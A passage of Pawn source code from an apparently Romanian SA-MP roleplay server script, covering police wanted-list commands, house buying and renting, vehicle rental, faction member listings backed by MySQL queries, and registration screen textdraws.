	if !OnDuty[playerid] && !IsAdmin(playerid, 1) *then return SendClientMessage(playerid, COLOR_LGREEN, "Nu poti folosi aceasta comanda deoarece nu esti la datorie!");

	extract params -> new player:id; else 
		return SendClientMessage(playerid,COLOR_GREY, "USAGE: {FFFFFF}/mdc <playerid/name>");

	if !IsPlayerConnected(id) *then
		return SendClientMessage(playerid, COLOR_GREY, "Player not connected!");

	if !IsPlayerLogged(id) *then
		return SendClientMessage(playerid, COLOR_GREY, "Player not logged!");
	
	if !PlayerInfo[id][pWantedLevel] *then
		return SendClientMessage(playerid, COLOR_GREY, "Acel player nu are wanted!");

	ShowMDC(playerid, id);
	return true;
}

stock ShowMDC(playerid, id) {
	MDCOn[playerid] = id;

	SCMf(playerid, -1, "-- MDC [ID %d - %s] [{FFFF00}W:%d{FFFFFF}] [Chased by %d cops] [Wanted expires in %02d:%02d] --", id, PlayerInfo[id][pUsername], PlayerInfo[id][pWantedLevel], WantedTime[id]/60, WantedTime[id]%60);
	SCMf(playerid, -1, "%s", PlayerInfo[id][pCrime]);
	return true;
}

redist::ChasedBy(playerid) {
	new x;
	for(new f=0,_x[5]={1,2,3,14,19};f!=sizeof _x;f++) {
		foreach(new i : faction_players<_x[f]>) if(MDCOn[i] == playerid && targetfind[i] == playerid) x++;
	}
	return x;
}
cmd:wanted(playerid, params[]) {
	if(!IsACop(playerid)) 
		return SendClientMessage(playerid, COLOR_GREY, "Nu faci parte din factiunea politiei.");

	if(!OnDuty[playerid]) 
		return SendClientMessage(playerid, COLOR_LGREEN, "Nu poti folosi aceasta comanda deoarece nu esti la datorie!");

	if(!Iter_Count(servicePlayers<8>)) 
		return SendClientMessage(playerid, COLOR_GREY, "Nu sunt suspecti conectati.");

	new x=0;gString[0] = (EOS);
	strcat(gString, "Name\tWanted level\tChased by\n");
	foreach(new i : servicePlayers<8>) {
		SelectedPlayers[playerid][x] = i; x++;
		format(gQuery, 128, "%s (%d)\tWanted level %d\t%d cops\n",GetName(i),i,PlayerInfo[i][pWantedLevel],ChasedBy(i));
		strcat(gString, gQuery);
	}
	format(gQuery, 128,"Wanted online: %d", Iter_Count(servicePlayers<8>));
	ShowPlayerDialog(playerid, DIALOG_WANTED, DIALOG_STYLE_TABLIST_HEADERS, gQuery, gString, "Ok", "Exit");
	return true;
}
cmd:suspect(playerid, params[]) {
	if !IsACop(playerid) *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Nu faci parte dintr-un departament!");

	if !OnDuty[playerid] *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Nu poti folosi aceasta comanda deoarece nu esti la datorie!");

	extract params -> new player:id; else
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/suspect <playerid/name>");

	if !IsPlayerConnected(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if !IsPlayerLogged(id) *then
		return SendClientMessage(playerid, COLOR_GREY, "Acel player nu este logat!");

	if id == playerid *then 
		return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceasta comanda asupra ta!");


	if IsACop(id) *then return true;

	new i=-1; gString="Nume\tNivel wanted\tDrept de predare\n",listitemm[playerid]=id;
	while(++i<16) format(gQuery, 128, "%s\t%d\t%s\n", wantedName(i), wantedList[i][0], (wantedList[i][1] == 1) ? ("Fara") : ("Da")), strcat(gString, gQuery);

	format(gQuery, 128, "%s (%d)", GetName(id), id);
	ShowPlayerDialog(playerid, DIALOG_SUSPECT, DIALOG_STYLE_TABLIST_HEADERS, gQuery, gString, "Select", "Cancel");	
	return true;
}
cmd:freepoints(playerid, params[]) {
	if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu faci parte dintr-un departament de politie!");
	SCMf(playerid, COLOR_LGREEN, "Free points: %d/10", PlayerInfo[playerid][pLawyer]);
	return true;
}

cmd:buyhouse(playerid, params[]) {
	if(PickupInfo[PlayerPickup[playerid]][pkType]!=1) return true;
	new h = PickupInfo[PlayerPickup[playerid]][pkID];
	if(!PlayerToPoint(2, playerid, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez]))
		return true;

	if(!HouseInfo[h][hValue]) 
		return true;

	if(PlayerInfo[playerid][pLevel] < HouseInfo[h][hLevel])
		return SCMf(playerid, COLOR_WHITE, "Ai nevoie de nivel %d pentru a cumpara.", HouseInfo[h][hLevel]);

	if(PlayerInfo[playerid][pHouse] != 999 && strcmp(GetName(playerid), HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0) 
		return SendClientMessage(playerid, COLOR_WHITE, "Ai deja o casa.");

	if(GetPlayerCash(playerid) < HouseInfo[h][hValue]) 
		return SendClientMessage(playerid, COLOR_GREY, "Nu ai destui bani pentru a cumpara aceasta casa.");

	mysql_format(SQL, gQuery, 256, "SELECT * FROM `users` WHERE `House` = '%i'", HouseInfo[h][hID]);
	mysql_tquery(SQL, gQuery, "sql_cache_house", "ii", playerid, h);			
	return true;
}

redist::sql_cache_house(playerid, h) {
	new id=-1;
	if(cache_num_rows()) {
		cache_get_value_name_int(0, "Status", id);
		if(id!=-1) {
			PlayerInfo[id][pHouse] = 999;
			UpdateVar(id, "House", 999);
			GivePlayerBank(id, HouseInfo[h][hValue]);
			SavePlayerBank(id);
			SCMf(id, 0x239931FF, "* %s ti-a cumparat casa pentru {19CF2E}$%s{239931}. Banii au fost transferati in contul tau bancar.", GetName(playerid), FormatNumber(HouseInfo[h][hValue]));
		} else {
			mysql_format(SQL, gQuery, 256, "UPDATE `users` SET `Bank` = `Bank`+'%i', `House` = '999' WHERE `name` = '%s'", HouseInfo[h][hValue], HouseInfo[h][hOwner]);
			mysql_tquery(SQL, gQuery);
		}
	}
	InInterior[playerid] = HOUSE_INTERIOR;
	InInteriorID[playerid] = h;
	PlayerInfo[playerid][pHouse] = HouseInfo[h][hID];
	UpdateVar(playerid, "House", PlayerInfo[playerid][pHouse]);
	UpdateVar(playerid, "Rented", -1);
	PlayerInfo[playerid][pRented] = -1;
	HouseInfo[h][hOwned] = 1;
	strmid(HouseInfo[h][hOwner], PlayerInfo[playerid][pUsername], 0, MAX_PLAYER_NAME);
	GivePlayerCash(playerid, -HouseInfo[h][hValue]);
	format(gString, sizeof gString, "A cumparat casa %d pentru $%s", HouseInfo[h][hID], FormatNumber(HouseInfo[h][hValue]));
	InsertLog(playerid, gString, LOG_MONEY);
	SetPlayerInterior(playerid,HouseInfo[h][hInterior]);
	SetPlayerPos(playerid,HouseInfo[h][hExitx],HouseInfo[h][hExity],HouseInfo[h][hExitz]);
	SetPlayerVirtualWorld(playerid,HouseInfo[h][hVirtual]);
	HouseInfo[h][hValue] = 0;
	SendClientMessage(playerid, COLOR_MONEY, "Felicitari! Ti-ai cumparat aceasta casa.");
	finishAchievement(playerid, 15);
	mysql_format(SQL, gQuery, 180, "UPDATE `houses` SET `Owned`='1',`Owner`='%s',`Value`='0' WHERE `ID`='%d'", PlayerInfo[playerid][pUsername], HouseInfo[h][hID]);
	mysql_tquery(SQL, gQuery);
	UpdateLabel(1, h);
	return true;
}
cmd:unloadtrash(playerid, params[]) {
	if(PlayerInfo[playerid][pJob] != 4 || !JobWorking[playerid])
		return true;

	if(CurseFacute[playerid] < 20)
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Trebuie sa ai peste 20 kilogramde de gunoi.");

	SendClientMessage(playerid, COLOR_YELLOW, "Du-te la checkpoint-ul de pe mapa pentru a primi banii pentru munca depusa!");
	PlayerTextDrawSetString(playerid, GarbagePTD, "~p~garbage man job~n~~g~~h~25/25 ~w~~h~kg of garbage");
	SetPlayerRaceCheckpoint(playerid, 3, 2570.1870,2781.7876,10.8203, 0.0, 0.0, 0.0, 6.0);
	CP[playerid] = 704;
	return true;
}
cmd:unrentcar(playerid, params[]) {
	if(!VehicleRent[playerid]) 
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai un vehicul inchiriat!");

	destroy_rent_car(playerid);
	return true;
}

cmd:rentcar(playerid, params[]) {
	if(GetPlayerVirtualWorld(playerid) > 0) return SendClientMessage(playerid, COLOR_LGREEN, "Nu poti folosi aceasta comanda cand esti in virtual world!");
	if(PlayerInfo[playerid][pCarLic] < 1) return SendClientMessage(playerid, COLOR_LIGHTGREEN, "Eroare: Nu ai licenta de condus.");
	if(VehicleRent[playerid]) return SendClientMessage(playerid, COLOR_WHITE, "Ai deja un vehicul inchiriat.");
	if(!PlayerToPoint(5, playerid, 2162.8953,1403.7704,10.8203)) return SendClientMessage(playerid, COLOR_WHITE, "Nu esti la Rent Car");
	format(gString, 128, "Vehicle\tStock\nPremier\t%d\nSuper GT\t%d\nSultan\t%d\nComet\t%d\nSunrise\t%d", RentStock[0], RentStock[1], RentStock[2], RentStock[3], RentStock[4]);
	ShowPlayerDialog(playerid, DIALOG_RENTCAR, DIALOG_STYLE_TABLIST_HEADERS, "SERVER: Rent Car", gString, "Select", "Cancel");
	return true;
}
cmd:rentbike(playerid, params[]) {
	if(GetPlayerVirtualWorld(playerid) > 0) return SendClientMessage(playerid, COLOR_LGREEN, "Nu poti folosi aceasta comanda cand esti in virtual world!");
	if(PlayerInfo[playerid][pCarLic] < 1) return SendClientMessage(playerid, COLOR_LIGHTGREEN, "Eroare: Nu ai licenta de condus.");
	if(VehicleRent[playerid]) return SendClientMessage(playerid, COLOR_WHITE, "Ai deja un vehicul inchiriat.");
	if(!PlayerToPoint(5, playerid, 2163.5081,1420.7107,10.8203)) return SendClientMessage(playerid, COLOR_WHITE, "Nu esti la Rent Bike");
	format(gString, 128, "Vehicle\tStock\nNRG-500\t%d\nFCR-900\t%d\nPCJ-600\t%d\nBMX\t%d\nMountain Bike\t%d", RentStock[5], RentStock[6], RentStock[7], RentStock[8], RentStock[9]);
	ShowPlayerDialog(playerid, DIALOG_RENTBIKE, DIALOG_STYLE_TABLIST_HEADERS, "SERVER: Rent Car", gString, "Select", "Cancel");
	return true;
}
cmd:renters(playerid, params[]) {
	if(PlayerInfo[playerid][pHouse] == 999) SendClientMessage(playerid, -1, "{FFB870}You don't have house or you don't have rentroom.");
	new h = PlayerInfo[playerid][pHouse], count=0;
	SendClientMessage(playerid, -1, "-- Online Renters --");
	foreach(new i : logged_players) {
		if(PlayerInfo[i][pHouse] == h) {
			SCMf(playerid, 0xffcc99FF, "* Player %s(%d).", GetName(i), i), count++;
		}
	}
	SCMf(playerid, -1, "* There are %d renters online.", count);	
	return true;
}

cmd:randomrenter(playerid, params[]) {
	if(PlayerInfo[playerid][pYouTuber] < 1) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Doar Youtuberii au acces la aceasta comanda.");
	if(strcmp(GetName(playerid), HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], false) == 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu detii o casa.");

	new players[MAX_PLAYERS], _max=0;
	foreach(new p: logged_players) if (PlayerInfo[p][pHouse] == PlayerInfo[playerid][pHouse] && playerid != p) players[_max++]=p;
	new id = players[random(_max)];
	SCMf(playerid, -1, "%s %d", GetName(id), id);
	return true;
}

cmd:rentroom(playerid, params[]) {
	new h = PickupInfo[PlayerPickup[playerid]][pkID];
	if(PickupInfo[PlayerPickup[playerid]][pkType]!=1) return true;
	if(!PlayerToPoint(2.0, playerid, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez]) || HouseInfo[h][hRentabil] != 1) return true;
	if(PlayerInfo[playerid][pHouse] != 999 && strcmp(GetName(playerid), HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0) return SendClientMessage(playerid, COLOR_WHITE, "Ai deja o casa.");
	if(GetPlayerCash(playerid)<PlayerInfo[playerid][pLevel]*250) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu ai banii necesari!");
	PlayerInfo[playerid][pRented] = HouseInfo[h][hID];
	PlayerInfo[playerid][pHouse] = HouseInfo[h][hID];
	SpawnChange[playerid] = 1;	
	InInterior[playerid] = HOUSE_INTERIOR;
	InInteriorID[playerid] = h;
	SendClientMessage(playerid, 0xFFADADFF, "Ai luat chirie la aceasta casa!");
	GivePlayerCash(playerid, -(250 * PlayerInfo[playerid][pLevel]));
	HouseInfo[h][hTakings] = HouseInfo[h][hTakings]+ 250 * PlayerInfo[playerid][pLevel];
	SetPlayerInterior(playerid,HouseInfo[h][hInterior]);
	SetPlayerPos(playerid,HouseInfo[h][hExitx],HouseInfo[h][hExity],HouseInfo[h][hExitz]);
	SetPlayerVirtualWorld(playerid,HouseInfo[h][hVirtual]);
	gQuery[0] = (EOS);
	mysql_format(SQL, gQuery, 128,"UPDATE users SET `Rented`='%d',`House`='%d', `SpawnChange` = '1' WHERE `ID`='%d'",PlayerInfo[playerid][pRented],PlayerInfo[playerid][pRented],PlayerInfo[playerid][pSQLID]);
	mysql_tquery(SQL, gQuery);
	return true;
}
cmd:bizmenu(playerid, params[]) {
	new biz;
	if((biz=PlayerInfo[playerid][pBizz]) == 255) return SendClientMessage(playerid, COLOR_GREY, "Nu ai o afacere!");
	ShowPlayerDialog(playerid, DIALOG_BMENU, DIALOG_STYLE_LIST, "Business menu", BizzInfo[biz][bLocked]?("Informatii\nDepozit\nInchis\nSeteaza numele\nSeteaza taxa\nVinde afacerea\nRadio"):("Informatii\nDepozit\nDeschis\nSeteaza numele\nSeteaza taxa\nVinde afacerea\nRadio"), "Ok", "Exit");	
	return true;
}
cmd:housemenu(playerid, params[]) {
	if(PlayerInfo[playerid][pHouse] != 999 && strcmp(GetName(playerid), HouseInfo[PlayerInfo[playerid][pHouse]][hOwner], true) == 0) {
		new string[180], open[64];
		if(HouseInfo[PlayerInfo[playerid][pHouse]][hLock] == 0) open = "Inchide usa";
		else open = "Deschide usa";
		format(string, sizeof(string), "Informatii\nChiriasi\nDepozit\n%s\nHouse upgrade\nSeteaza numele\nSeteaza chiria\nVinde casa\nRadio\nHouse upgrades", open);
		ShowPlayerDialog(playerid, DIALOG_HMENU, DIALOG_STYLE_LIST, "House menu", string, "Ok", "Exit");
	}
	else SendClientMessage(playerid, COLOR_GREY, "Nu ai o casa!");
	return true;
}

stock showRenters(playerid) {
	mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `users` WHERE `Rented` = '%d' LIMIT 50", PlayerInfo[playerid][pHouse]);
	mysql_tquery(SQL, gQuery, #sql_tenants, #playerid);
	return true;
}

redist::sql_tenants(playerid) {
	new name[MAX_PLAYER_NAME],i=-1, j=-1, userID=-1, online=0;
	if(!(j=cache_num_rows()))
	 	return true;

	while(++i!=j) {
		cache_get_value_name(i, "name", name);
		cache_get_value_name_int(i, "Status", userID);
		if userID!=-1 *then format(gQuery, 60, "%d. %s (%d) (Online)\n", i+1, name, userID), strcat(gString, gQuery);
		else format(gQuery, 60, "%d. %s (Offline)\n", i+1, name), strcat(gString, gQuery);
	}
	format(gQuery, 128, "Renters (%d/%d)", online, j);
	ShowPlayerDialog(playerid, DIALOG_INVALID, DIALOG_STYLE_LIST, gQuery, gString, "Ok", "Exit");	
	return true;
}

stock showRandomTenants(playerid) {
	mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `users` WHERE `Rented` = '%d' LIMIT 50", PlayerInfo[playerid][pHouse]);
	mysql_tquery(SQL, gQuery, #sql_random_tenants, #playerid);
	return true;
}

stock insertFactionLogs(player, leader, const string[], va_args<>) {
	new name[MAX_PLAYER_NAME], name2[MAX_PLAYER_NAME], out[168], hour,minute,seconds, days, mounth, year; 
	gettime(hour,minute,seconds), getdate(year, mounth, days);
	va_format(out, sizeof out, string, va_start<3>);

	if(player!=-1) strmid(name,PlayerInfo[player][pUsername],0,24); if(leader!=-1) strmid(name2,PlayerInfo[leader][pUsername],0,24);
	return _query("INSERT INTO faction_logs (`text`,`player`,`leader`,`time`,`player_name`,`leader_name`,`skin`) VALUES ('%s','%d','%d','%02d-%02d-%d %02d:%02d:%02d', '%s', '%s', '%i')", out, PlayerInfo[leader][pSQLID], player != -1 ? PlayerInfo[player][pSQLID] : -1, days, mounth, year, hour, minute, seconds, name, name2, PlayerInfo[leader][pModel]);
}

cmd:fvrespawn(playerid, params[]) {
    if(PlayerInfo[playerid][pRank] < 5) return true;
    new f;
    switch(PlayerInfo[playerid][pMember]) {
    	case 4: f=0;
    	case 5: f=1;
    	case 6: f=2;
    	case 10: f=3;
    	case 17: f=4;
    	case 18: f=5;
    	case 25: f=6;
    	case 26: f=7;
    	case 27: f=8;
    	default: return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Acest comanda nu este disponibila factiunei tale.");
	}	
	foreach(new v : FactionVehicle<f>) {
		if(!IsVehicleOccupied(ServerVehicles[v][vSpawned])) SetVehicleToRespawn(ServerVehicles[v][vSpawned]), Gas[ServerVehicles[v][vSpawned]] = 100;		
	}
	gString[0] = (EOS);
	format(gString, 128, "Your faction's vehicles were respawned by %s (rank %d).", GetName(playerid), PlayerInfo[playerid][pRank]);
	SendFactionMessage(PlayerInfo[playerid][pMember], COLOR_CLIENT, gString);	
    return true;
}
cmd:members(playerid, params[]) return ShowFactionMembers(playerid);
stock ShowFactionMembers(playerid) {
	if(!PlayerInfo[playerid][pMember]) return true;
	if(PlayerInfo[playerid][pRank]<6) return true;
	mysql_format(SQL, gQuery, 128, "SELECT * FROM `users` WHERE `Member` = '%d' ORDER BY `users`.`Rank` DESC LIMIT 20", PlayerInfo[playerid][pMember]);
	mysql_tquery(SQL, gQuery, "SQL_Check_Members", "i", playerid);
	return true;
}

redist::SQL_Check_Members(playerid) {
	new szDialog[750], name[MAX_PLAYER_NAME], lastl[30], rank, fw, onmembers, days, userID, bool:tester, bool:responsabil, Float:l7h; gString[0] = gQuery[0] = (EOS);
	strcat(szDialog, "#. Name\tRank - FW - L7H\tLast Online\tDays\n");
	for(new i,j=cache_num_rows();i!=j;i++) {
		cache_get_value_name(i, "name", name); 
		cache_get_value_name(i, "c", lastl);
		cache_get_value_name_int(i, "Rank", rank); 
		cache_get_value_name_bool(i, "Tester", tester); 
		cache_get_value_name_bool(i, "Responsabil", responsabil); 
		cache_get_value_name_int(i, "FWarn", fw);  
		cache_get_value_name_int(i, "Days", days);  
		cache_get_value_name_int(i, "Status", userID);  
		cache_get_value_name_float(i, "ConnectedMonth", l7h); 
		
		format(Selected[playerid][i], MAX_PLAYER_NAME, name);

        if(userID != -1) onmembers++,format(gString, 128, "%d. %s%s%s (%d)\t%d - %d - %.2f/3\tOnline\t%d\n", i+1, tester?("{93DD13}[T]{FFFFFF} "):(""), responsabil?("{93DD13}[R]{FFFFFF} "):(""), name, userID, PlayerInfo[userID][pRank], fw, l7h, days);
        else format(gString, 128, "%d. %s%s%s\t%d - %d/3 - %.2f\t%s\t%d\n", i+1, tester?("{93DD13}[T]{FFFFFF} "):(""), responsabil?("{93DD13}[R]{FFFFFF} "):(""), name, rank, fw, l7h, lastl, days);
        strcat(szDialog, gString);
	}
	format(gString, 128, "Members (%d/%d)", onmembers, cache_num_rows());
	ShowPlayerDialog(playerid, DIALOG_MEMBERS, DIALOG_STYLE_TABLIST_HEADERS, gString, szDialog, "Select", "Cancel");
	return true;
}

cmd:playerobject(playerid, params[]) {
    if(!IsAdmin(playerid, 7)) return true;
    if(sscanf(params, "uiii", params[0], params[1], params[2], params[3])) return SendClientMessage(playerid, COLOR_GREY, "Usage: {FF0000} /playerobject <playerid> [index] [id object] [body part]");
    if((params[1] < 0 || params[1] > 9)  || (params[3] < 1 || params[3] > 18)) return true;
    RemovePlayerAttachedObject(params[0], params[1]);
    SetPlayerAttachedObject(params[0], params[1], params[2], params[3], 0.0, 0.0, 0.0, 0.0, 0.0, 0.0);
    EditAttachedObject(params[0],params[1]);
    return true;
}
cmd:deleteobject(playerid, params[]) {
    if(!IsAdmin(playerid, 7)) return true;
    if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, COLOR_GREY, "Usage: /deleteobiect <playerid>");
    for(new i; i < 9; i++) RemovePlayerAttachedObject(params[0], i);
    SendClientMessage(playerid, COLOR_GREY, "{03c03c} obiectele eliminate din player");
    return true;
}

cmd:setstatus(playerid, params[]) {
	if(PlayerInfo[playerid][pLeader] == 0) return SendClientMessage(playerid, COLOR_GREY, "Nu esti lider de factiune!");
	switch(DynamicFactions[PlayerInfo[playerid][pLeader]][fApp]) {
		case 0: SendClientMessage(playerid, COLOR_YELLOW, "Aplicatiile la factiunea ta au fost deschise."), DynamicFactions[PlayerInfo[playerid][pLeader]][fApp] = 1;
	    case 1: SendClientMessage(playerid, COLOR_YELLOW, "Aplicatiile la factiunea ta au fost inchise."), DynamicFactions[PlayerInfo[playerid][pLeader]][fApp] = 0;
	}
	_query("UPDATE `factions` SET `App`='%d' WHERE `ID`='%d'", DynamicFactions[PlayerInfo[playerid][pLeader]][fApp], PlayerInfo[playerid][pLeader]);
	return true;
}
stock LoadPlayerRegister(playerid) {
	RegisterPTD[playerid][0] = CreatePlayerTextDraw(playerid, 112.699745, 128.411865, "");
	PlayerTextDrawLetterSize(playerid, RegisterPTD[playerid][0], 0.000000, 0.000000);
	PlayerTextDrawTextSize(playerid, RegisterPTD[playerid][0], 127.179824, 120.720153);
	PlayerTextDrawAlignment(playerid, RegisterPTD[playerid][0], 1);
	PlayerTextDrawColor(playerid, RegisterPTD[playerid][0], -1);
	PlayerTextDrawSetShadow(playerid, RegisterPTD[playerid][0], 0);
	PlayerTextDrawSetOutline(playerid, RegisterPTD[playerid][0], 0);
	PlayerTextDrawBackgroundColor(playerid, RegisterPTD[playerid][0], 0);
	PlayerTextDrawFont(playerid, RegisterPTD[playerid][0], 5);
	PlayerTextDrawSetProportional(playerid, RegisterPTD[playerid][0], 0);
	PlayerTextDrawSetShadow(playerid, RegisterPTD[playerid][0], 0);
	PlayerTextDrawSetPreviewModel(playerid, RegisterPTD[playerid][0], 250);
	PlayerTextDrawSetPreviewRot(playerid, RegisterPTD[playerid][0], 0.000000, 0.000000, 40.000000, 1.000000);


	RegisterPTD[playerid][1] = CreatePlayerTextDraw(playerid, 371.202972, 132.100097, GetName(playerid));
	PlayerTextDrawLetterSize(playerid, RegisterPTD[playerid][1], 0.288001, 1.409999);
	PlayerTextDrawTextSize(playerid, RegisterPTD[playerid][1], 0.000000, 144.249862);
	PlayerTextDrawAlignment(playerid, RegisterPTD[playerid][1], 2);
	PlayerTextDrawColor(playerid, RegisterPTD[playerid][1], -1);
	PlayerTextDrawUseBox(playerid, RegisterPTD[playerid][1], 1);
	PlayerTextDrawBoxColor(playerid, RegisterPTD[playerid][1], 0x00000080);
	PlayerTextDrawSetShadow(playerid, RegisterPTD[playerid][1], 0);
	PlayerTextDrawSetOutline(playerid, RegisterPTD[playerid][1], 1);
	PlayerTextDrawBackgroundColor(playerid, RegisterPTD[playerid][1], 255);
	PlayerTextDrawFont(playerid, RegisterPTD[playerid][1], 2);
	PlayerTextDrawSetProportional(playerid, RegisterPTD[playerid][1], 1);
	PlayerTextDrawSetShadow(playerid, RegisterPTD[playerid][1], 0);

	RegisterPTD[playerid][2] = CreatePlayerTextDraw(playerid, 371.303100, 149.775054, "CLICK HERE");
	PlayerTextDrawLetterSize(playerid, RegisterPTD[playerid][2], 0.288001, 1.409999);
	PlayerTextDrawTextSize(playerid, RegisterPTD[playerid][2], 15.000000, 144.249862);
	PlayerTextDrawAlignment(playerid, RegisterPTD[playerid][2], 2);
	PlayerTextDrawColor(playerid, RegisterPTD[playerid][2], -1);
	PlayerTextDrawUseBox(playerid, RegisterPTD[playerid][2], 1);
	PlayerTextDrawBoxColor(playerid, RegisterPTD[playerid][2], 0x00000080);
	PlayerTextDrawSetShadow(playerid, RegisterPTD[playerid][2], 0);
	PlayerTextDrawSetOutline(playerid, RegisterPTD[playerid][2], 1);
	PlayerTextDrawBackgroundColor(playerid, RegisterPTD[playerid][2], 255);
	PlayerTextDrawFont(playerid, RegisterPTD[playerid][2], 2);
	PlayerTextDrawSetProportional(playerid, RegisterPTD[playerid][2], 1);
	PlayerTextDrawSetShadow(playerid, RegisterPTD[playerid][2], 0);
	PlayerTextDrawSetSelectable(playerid, RegisterPTD[playerid][2], true);
	PlayerTextID[playerid][PlayerText:RegisterPTD[playerid][2]] = 0;

	RegisterPTD[playerid][3] = CreatePlayerTextDraw(playerid, 371.203063, 167.662658, "CLICK HERE");
	PlayerTextDrawLetterSize(playerid, RegisterPTD[playerid][3], 0.288001, 1.409999);
	PlayerTextDrawTextSize(playerid, RegisterPTD[playerid][3], 15.000000, 144.249862);
	PlayerTextDrawAlignment(playerid, RegisterPTD[playerid][3], 2);
	PlayerTextDrawColor(playerid, RegisterPTD[playerid][3], -1);
	PlayerTextDrawUseBox(playerid, RegisterPTD[playerid][3], 1);
	PlayerTextDrawBoxColor(playerid, RegisterPTD[playerid][3], 0x00000080);
	PlayerTextDrawSetShadow(playerid, RegisterPTD[playerid][3], 0);
	PlayerTextDrawSetOutline(playerid, RegisterPTD[playerid][3], 1);
	PlayerTextDrawBackgroundColor(playerid, RegisterPTD[playerid][3], 255);
	PlayerTextDrawFont(playerid, RegisterPTD[playerid][3], 2);
	PlayerTextDrawSetProportional(playerid, RegisterPTD[playerid][3], 1);
	PlayerTextDrawSetShadow(playerid, RegisterPTD[playerid][3], 0);
	PlayerTextDrawSetSelectable(playerid, RegisterPTD[playerid][3], true);
	PlayerTextID[playerid][PlayerText:RegisterPTD[playerid][3]] = 1;

	RegisterPTD[playerid][4] = CreatePlayerTextDraw(playerid, 371.203033, 185.662689, "CLICK HERE");
	PlayerTextDrawLetterSize(playerid, RegisterPTD[playerid][4], 0.237001, 1.409999);
	PlayerTextDrawTextSize(playerid, RegisterPTD[playerid][4], 15.000000, 144.249862);
	PlayerTextDrawAlignment(playerid, RegisterPTD[playerid][4], 2);
	PlayerTextDrawColor(playerid, RegisterPTD[playerid][4], -1);
	PlayerTextDrawUseBox(playerid, RegisterPTD[playerid][4], 1);
	PlayerTextDrawBoxColor(playerid, RegisterPTD[playerid][4], 0x00000080);
	PlayerTextDrawSetShadow(playerid, RegisterPTD[playerid][4], 0);
	PlayerTextDrawSetOutline(playerid, RegisterPTD[playerid][4], 1);
	PlayerTextDrawBackgroundColor(playerid, RegisterPTD[playerid][4], 255);
	PlayerTextDrawFont(playerid, RegisterPTD[playerid][4], 2);
	PlayerTextDrawSetProportional(playerid, RegisterPTD[playerid][4], 1);
	PlayerTextDrawSetShadow(playerid, RegisterPTD[playerid][4], 0);
	PlayerTextDrawSetSelectable(playerid, RegisterPTD[playerid][4], true);
	PlayerTextID[playerid][PlayerText:RegisterPTD[playerid][4]] = 2;

	RegisterPTD[playerid][5] = CreatePlayerTextDraw(playerid, 371.203094, 203.750091, "CLICK HERE");
	PlayerTextDrawLetterSize(playerid, RegisterPTD[playerid][5], 0.288001, 1.409999);
	PlayerTextDrawTextSize(playerid, RegisterPTD[playerid][5], 15.000000, 144.249862);
	PlayerTextDrawAlignment(playerid, RegisterPTD[playerid][5], 2);
	PlayerTextDrawColor(playerid, RegisterPTD[playerid][5], -1);
	PlayerTextDrawUseBox(playerid, RegisterPTD[playerid][5], 1);
	PlayerTextDrawBoxColor(playerid, RegisterPTD[playerid][5], 0x00000080);
	PlayerTextDrawSetShadow(playerid, RegisterPTD[playerid][5], 0);
	PlayerTextDrawSetOutline(playerid, RegisterPTD[playerid][5], 1);
	PlayerTextDrawBackgroundColor(playerid, RegisterPTD[playerid][5], 255);
	PlayerTextDrawFont(playerid, RegisterPTD[playerid][5], 2);
	PlayerTextDrawSetProportional(playerid, RegisterPTD[playerid][5], 1);
	PlayerTextDrawSetShadow(playerid, RegisterPTD[playerid][5], 0);
	PlayerTextDrawSetSelectable(playerid, RegisterPTD[playerid][5], true);
	PlayerTextID[playerid][PlayerText:RegisterPTD[playerid][5]] = 3;

	RegisterPTD[playerid][6] = CreatePlayerTextDraw(playerid, 371.303131, 221.637481, "CLICK HERE");
	PlayerTextDrawLetterSize(playerid, RegisterPTD[playerid][6], 0.288001, 1.409999);
	PlayerTextDrawTextSize(playerid, RegisterPTD[playerid][6], 15.000000, 144.249862);
	PlayerTextDrawAlignment(playerid, RegisterPTD[playerid][6], 2);
	PlayerTextDrawColor(playerid, RegisterPTD[playerid][6], -1);
	PlayerTextDrawUseBox(playerid, RegisterPTD[playerid][6], 1);
	PlayerTextDrawBoxColor(playerid, RegisterPTD[playerid][6], 0x00000080);
	PlayerTextDrawSetShadow(playerid, RegisterPTD[playerid][6], 0);
	PlayerTextDrawSetOutline(playerid, RegisterPTD[playerid][6], 1);
	PlayerTextDrawBackgroundColor(playerid, RegisterPTD[playerid][6], 255);
	PlayerTextDrawFont(playerid, RegisterPTD[playerid][6], 2);
	PlayerTextDrawSetProportional(playerid, RegisterPTD[playerid][6], 1);
	PlayerTextDrawSetShadow(playerid, RegisterPTD[playerid][6], 0);
	PlayerTextDrawSetSelectable(playerid, RegisterPTD[playerid][6], true);
	PlayerTextID[playerid][PlayerText:RegisterPTD[playerid][6]] = 4;
	return true;
}

stock GetIPP(playerid) {
	new ip_s[16]; GetPlayerIp(playerid, ip_s, sizeof ip_s);
	return ip_s;
}

stock checkPlayerAccount(playerid) {
	PlayerTextDrawDestroy(playerid, LoginQueuePTD[playerid]);
	GameTextForPlayer(playerid,"~n~~n~~n~~n~~n~~n~~n~~n~~y~~h~loading your account...~n~~w~~h~please wait!", 30000, 3);

	mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `bans` WHERE (`PlayerName` = '%s' OR `IP` = '%s') AND `Active` != '1' LIMIT 1", PlayerInfo[playerid][pUsername], playerIP[playerid]);
	mysql_tquery(SQL, gQuery, #cache_player_account, #i, playerid);
	return true;
}

redist::cache_player_account(playerid) {
